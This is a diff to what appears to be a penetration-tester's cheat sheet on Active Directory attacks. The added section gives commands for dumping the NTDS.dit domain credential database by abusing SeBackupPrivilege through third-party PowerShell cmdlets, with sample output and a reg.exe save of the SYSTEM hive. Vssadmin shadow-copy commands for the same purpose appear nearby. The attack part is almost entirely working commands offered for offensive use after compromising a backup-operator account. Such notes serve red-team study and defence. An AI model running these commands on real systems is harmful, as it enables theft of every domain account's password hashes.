@@ -1456,7 +1456,7 @@ harmj0ys article explains it best.
 
 Dump NTDS.dit
 
-```
+```powershell
 C:\vssadmin create shadow /for=C:
 copy \\?
 \GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit
@@ -1472,6 +1472,32 @@ vssadmin delete shadows /for= [/oldest | /all | /shadow=]
 
 
 If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit
+```
+
+
+
+SeBackupPrivlege - Dump NTDS.dit
+
+```powershell
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+
+PS C:\m0chan> Get-SeBackupPrivilege
+SeBackupPrivilege is disabled
+
+PS C:\m0chan> Set-SeBackupPrivilege
+
+PS C:\m0chan> Get-SeBackupPrivilege
+SeBackupPrivilege is enabled
+
+PS C:\m0chan> Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite
+Copied 12582912 bytes
+
+Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit 
+
+Remember and not use C:\Windows\ntds\ntds.dit
+
+reg.exe save hklm\system c:\m0chan\SYSTEM.bak
 ```
 
 
